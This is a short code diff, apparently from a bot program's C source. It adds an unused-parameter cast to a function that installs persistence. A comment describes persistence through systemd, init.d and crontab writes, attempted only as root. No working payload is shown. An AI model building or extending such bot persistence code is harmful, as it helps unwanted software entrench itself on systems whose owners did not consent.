@@ -185,6 +185,7 @@ int install_sysv(const char *bin_path) {
 
 /* ── Install Persistence ─────────────────────────────────── */
 int persist_install(notnet_bot_t *bot) {
+    (void)bot;  /* reserved for future use (e.g. per-bot persistence config) */
     /* SECURITY FIX (#7): Only attempt persistence as root — otherwise
      * the writes to /etc/systemd/system, /etc/init.d, and crontab will
      * fail or require dangerous sudo escalation. */
